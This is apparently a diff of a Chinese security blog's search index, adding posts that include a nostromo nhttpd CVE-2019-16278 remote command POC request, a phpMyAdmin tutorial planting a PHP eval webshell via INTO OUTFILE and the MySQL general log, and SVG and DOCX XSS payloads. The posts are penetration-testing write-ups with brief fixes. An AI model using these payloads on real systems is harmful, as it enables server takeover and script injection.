@@ -1,6 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[nostromo nhttpd 路径遍历漏洞]]></title>
+    <url>%2F2019%2F10%2F17%2FCVE-2019-16278%2F</url>
+    <content type="text"><![CDATA[0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞描述 0X05 漏洞POC 0X06 漏洞复现 0X07 修复建议 0X08 Reference 0X00 简介 nostromo nhttpd是一款开源的Web服务器。 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X01 CVE编号 CVE-2019-16278 0X02 漏洞威胁等级 高危 0X03 影响范围 nostromo nhttpd &lt;= 1.9.6 0X04 漏洞描述 nostromo nhttpd 1.9.6及之前版本中的‘http_verify’函数存在路径遍历漏洞。该漏洞源于网络系统或产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置。 0X05 漏洞POC CVE-2019-16278.sh 12345678POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0Connection: closeUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Content-Length: 25 echo echo ifconfig 2&gt;&amp;1 0X06 漏洞复现 记录一下，请参考： https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278 0X07 修复建议 上waf或防火墙配置规则拦截,等待官方修复打补丁。 0X08 Reference 参考链接： http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807 https://git.sp0re.sh/sp0re/Nhttpd-exploits]]></content>
+      <categories>
+        <category>CVE-2019</category>
+      </categories>
+      <tags>
+        <tag>CVE-2019-16278</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[接口快速测试小技巧(Python)]]></title>
+    <url>%2F2019%2F10%2F11%2F%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)%2F</url>
+    <content type="text"><![CDATA[接口快速测试小技巧(Python) 终于找到解决我每次写请求头不停复制粘贴，改格式。之后我们可以这样，提高了测试的效率，免得重复造轮子，不只是支持python，而且还支持多种编程语言转换。🐂🍺 网站：https://curl.trillworks.com]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>WEB渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[SVG-XSS]]></title>
     <url>%2F2019%2F10%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS%2F</url>
     <content type="text"><![CDATA[SVG-XSS 介绍 SVG文件 Xss Payload SVG-XSS介绍 跨站点脚本（XSS）是一个非常常见的漏洞，涉及在网页中注入javascript代码。从窃取用户Cookie到通过CORS绕过SOP，此漏洞可用于执行各种操作。有许多方法可以定位XSS漏洞，通常会忽略SVG文件。 SVG文件 可缩放矢量图形（SVG）是用于二维图形的基于XML的矢量图像格式，并支持交互性和动画。 以下代码是基本SVG文件的示例： 123&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;&lt;/svg&gt; SVG文件还支持嵌入式javascript代码。例如，开发人员可能在svg图像中使用javascript，以便他们可以实时进行操作。这可以用于动画和其他任务。 要注意的另一件事是，SVG文件可以视为HTML中的图像。这意味着您可以将SVG文件放置在图像标签中，并且可以完美呈现： 1&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt; Xss Payload 如果网站使用XSS有效负载加载SVG文件，则将执行该文件。开发人员和攻击者都经常忽视这一点。以下是带有警报XSS有效负载的SVG文件示例： 123456789&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt; &lt;script type=&quot;text/javascript&quot;&gt; alert(&quot;SVG XSS&quot;); &lt;/script&gt;&lt;/svg&gt; 上传时，注意内容类型设置为：Content-Type: image/svg+xml 上传图像后，您只需找出图像上载到的路径即可。如果您使用的是Google chrome，则可以通过右键单击图片并选择“复制图片地址”来轻松完成此操作。如果在查看图像时一切正常，则将执行有效负载。您只是通过SVG文件存储了XSS。]]></content>
@@ -78,17 +100,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[什么是AJAX]]></title>
-    <url>%2F2019%2F08%2F20%2F%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86-%E4%BB%80%E4%B9%88%E6%98%AFAJAX%2F</url>
-    <content type="text"><![CDATA[一、什么是Ajax? AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术 Ajax是一种技术方案，但并不是一种新技术。它依赖现有的CSS/HTML/JavaScript，而其中最核心的依赖是浏览器提供的XMLHttpRequest对象，是这个对象使得浏览器可以发出HTTP请求与接收HTTP响应。实现了在页面不刷新个情况下和服务器进行数据交互。 这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。 二、如何实现Ajax？ (1)创建XMLHttpRequest对象,也就是创建一个异步调用对象. (2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. (3)设置响应HTTP请求状态变化的函数. (4)发送HTTP请求. (5)获取异步调用返回的数据. (6)使用JavaScript和DOM实现局部刷新. 0x01 Demo user.json 1234&#123; &quot;name&quot;:&quot;VK&quot;, &quot;age&quot;:&quot;25&quot;&#125; ajax.html 0x02 演示 网站A获取网站B的用户数据： 网站A：http://vkduang.com/AJAX/ajax.html 网站B：http://vkkuayu.com:8000/user.json 你会发现console报出了如下的错误; 很明显请求是受到同源策略的限制。 0x03 哪些资源是默认可以跨域的 上面定义提到了”受限制”, 也就是说不是所有的跨域资源需要CORS机制。 思考🤔]]></content>
-      <categories>
-        <category>前端安全</category>
-      </categories>
-      <tags>
-        <tag>前端知识</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[Null Dereference]]></title>
     <url>%2F2019%2F08%2F20%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Null%20Dereference%2F</url>
     <content type="text"><![CDATA[1、Null Dereference（空指针异常） 1.1、产生原因： 2.2、修复方案： 1、Null Dereference（空指针异常）1.1、产生原因： 当违反程序员的一个或多个假设时，通常会出现 null 指针异常。如果程序明确将对象设置为null，但稍后却间接引用该对象，则将出现 dereference-after-store 错误。此错误通常是因为程序员在声明变量时将变量初始化为 null。大部分空指针问题只会引起一般的软件可靠性问题，但如果攻击者能够故意触发空指针间接引用，攻击者就有可能利用引发的异常绕过安全逻辑，或致使应用程序泄漏调试信息，这些信息对于规划随后的攻击十分有用。 示例：在下列代码中，程序员将变量 foo 明确设置为 null。稍后，程序员间接引用 foo，而未检查对象是否为 null 值。 图1：引起Null Dereference漏洞的代码 2.2、修复方案： 在间接引用可能为 null 值的对象之前，请务必仔细检查。如有可能，在处理资源的代码周围的包装器中纳入 null 检查，确保在所有情况下均会执行 null 检查，并最大限度地减少出错的地方。 图2：修复Null Dereference漏洞后的代码]]></content>
@@ -155,6 +166,17 @@
       </tags>
   </entry>
   <entry>
+    <title><![CDATA[什么是AJAX]]></title>
+    <url>%2F2019%2F02%2F07%2F%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86-%E4%BB%80%E4%B9%88%E6%98%AFAJAX%2F</url>
+    <content type="text"><![CDATA[一、什么是Ajax? AJAX全称为“Asynchronous JavaScript and XML”(异步JavaScript和XML),是一种创建交互式网页应用的网页开发技术 Ajax是一种技术方案，但并不是一种新技术。它依赖现有的CSS/HTML/JavaScript，而其中最核心的依赖是浏览器提供的XMLHttpRequest对象，是这个对象使得浏览器可以发出HTTP请求与接收HTTP响应。实现了在页面不刷新个情况下和服务器进行数据交互。 这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。 二、如何实现Ajax？ (1)创建XMLHttpRequest对象,也就是创建一个异步调用对象. (2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. (3)设置响应HTTP请求状态变化的函数. (4)发送HTTP请求. (5)获取异步调用返回的数据. (6)使用JavaScript和DOM实现局部刷新. 0x01 Demo user.json 1234&#123; &quot;name&quot;:&quot;VK&quot;, &quot;age&quot;:&quot;25&quot;&#125; ajax.html 0x02 演示 网站A获取网站B的用户数据： 网站A：http://vkduang.com/AJAX/ajax.html 网站B：http://vkkuayu.com:8000/user.json 你会发现console报出了如下的错误; 很明显请求是受到同源策略的限制。 0x03 哪些资源是默认可以跨域的 上面定义提到了”受限制”, 也就是说不是所有的跨域资源需要CORS机制。 思考🤔]]></content>
+      <categories>
+        <category>前端安全</category>
+      </categories>
+      <tags>
+        <tag>前端知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[CTF中常见的加解密集合]]></title>
     <url>%2F2019%2F01%2F08%2FCTF-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8A%A0%E8%A7%A3%E5%AF%86%E9%9B%86%E5%90%88%2F</url>
     <content type="text"><![CDATA[CTF中常见的加解密集合 CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 今天我们来聊聊CTF中杂项遇到过的常见的加解密吧！ 转载-原文链接 整理了几个免费的解密网站（长按跳转） http://ctf.ssleye.com/ https://www.qqxiuzi.cn/ https://www.ctftools.com/down/ https://tool.bugku.com/?wafcloud=1 http://www.nicetool.net]]></content>
@@ -191,6 +213,17 @@
     <title><![CDATA[DOCX文件弹出XSS]]></title>
     <url>%2F2018%2F07%2F28%2FDOCX%E6%96%87%E4%BB%B6%E5%BC%B9%E5%87%BAXSS%2F</url>
     <content type="text"><![CDATA[背景： 如何使用Microsoft Word文档（docx格式）将跨站点脚本（XSS）漏洞上传到Web服务器 支持在线读取word文档 或者允许上传html文件，浏览器并成功解析(Content-Type为text/html) 构造XSS弹框word 方式一： Microsoft Word文档的核心是一个包含XML和Word文件; 我们可以通过运行Linux命令strings file-sample.docx来查看文件中所有的ASCII字符，以查看可用的字符串; 将文件解压缩，方便我们在不损坏文件的情况下，修改它； 例如修改settings.xml为aaaaaaaaa.xml; 然后输入zip -r 重新打包，生成新文件; 利用ultraedit文本编辑器查看十六进制代码块找到A的字符串,并修改为js代码; 12345# strings file-sample.docx# unzip file-sample.docx# cd word# mv settings.xml aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.xml# zip -r test.docx * 方式二： 直接利用ultraedit文本编辑器找到word文档空白位置,在不破坏文档的情况下，修改为JS代码保存即可; 防护措施 这样的效果对于开发者来说应该采取以下手段来进行限制。 文件上传之前，在服务器端验证上传文件格式是否为.doc或.docx有效格式； 严格限制Content-Type头，对Content-Type头或特定后缀格式更改过的上传文件须保持与上传文件相同的Content-Type头信息； 控制文件下载时的其它操作情况，添加响应标头:“Content-Disposition: attachment”，以防止在浏览器中内嵌显示文件； 过滤掉所有包含HTML标签的上传，因为docx可经压缩篡改其中包含的HTML文件。]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+      <tags>
+        <tag>WEB渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PhpMyadmin_Getshell]]></title>
+    <url>%2F2018%2F06%2F17%2FPhpMyadmin_Getshell%2F</url>
+    <content type="text"><![CDATA[phpmyadmin_getshell 0x01 into outfile 0x02 利用日志getshell phpmyadmin_getshell 当发现存有phpmyadmin目录时，进而通过弱口令或者暴力破解进入数据库之后，如何getshell? 写入WebShell主要条件： Root数据库用户（root权限） 网站绝对路径（确定有写入权限） magic_quotes_gpc：Off（关闭） 写入WebShell其它条件： magic_quotes_gpc：开启时，会对’单引号进行转义，使其变成“\”反斜杠。 secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。 file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。 0x01 into outfile 0x001前提条件： 1.Root数据库用户（root权限） 2.网站绝对路径（确定有写入权限） 12345暴绝对路径phpMyAdmin/libraries/select_lang.lib.phpphpMyAdmin/darkblue_orange/layout.inc.phpphpMyAdmin/index.php?lang[]=1phpmyadmin/themes/darkblue_orange/layout.inc.php 3.查看能否自定义导入导出数据到任意目录的权限 12345678查看能否自定义导出文件目录的权限 show global variables like &quot;%secure%&quot;; //查询secure_file_priv配置 secure_file_prive=null //不允许导入导出数据到目录 secure_file_priv=c:\sec //允许导入导出数据到指定目录 secure_file_priv=&apos;&apos; //允许导入导出数据到任意目录 secure_file_priv=&quot;/&quot; //允许导入导出数据到任意目录 注：在my.ini、my.cnf、mysqld.cnf文件中找到secure_file_prive并将其值设置为&quot;&quot;或&quot;/&quot;，重启MySQL服务！ 0x002 导入一句话shell 123select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:/xampp/htdocs/1.php&apos;; select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:\\xampp\\htdocs\\2.php&apos;;select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into dumpfile &apos;c:\\xampp\\htdocs\\3.php&apos;; 0x003 测试写入phpinfo文件 select ‘‘ into dumpfile ‘c:\xampp\htdocs\phpinfo.php’; 0x02 利用日志getshell 0x001 前提条件： 要求mysql的版本为5.0以上，因为5.0以上会创建日志文件 要求对日志有可读可写的权限 0x002 原理 phpmyadmin有一个记录日志的文件，但是一般情况下会关闭，开启日志记录，然后设置日志记录名称为.php，随便执行sql语句，只要包括一句话木马就会被写入到日志中去，然后就可以连接getshell 0x003 日志备份获取shell show global variables like “%genera%”;//查询general_log配置 当前的状态是off，需要手动开启日志，输入以下命令： set global general_log=’on’; 然后再次查询general_log配置已变成ON，设置Webshell日志文件保存路径，Mysql会判断日志文件是否存在，如果不存在则会自动创建。输入以下命令： SET global general_log_file=’c:/xampp/htdocs/rizhi.php’; 查看日志文件保存路径，对应的就会生成rizhi.php文件 一句话写入日志文件 关闭 general_log模式 set global general_log=’off’; 使用蚁剑连接]]></content>
       <categories>
         <category>WEB安全</category>
       </categories>
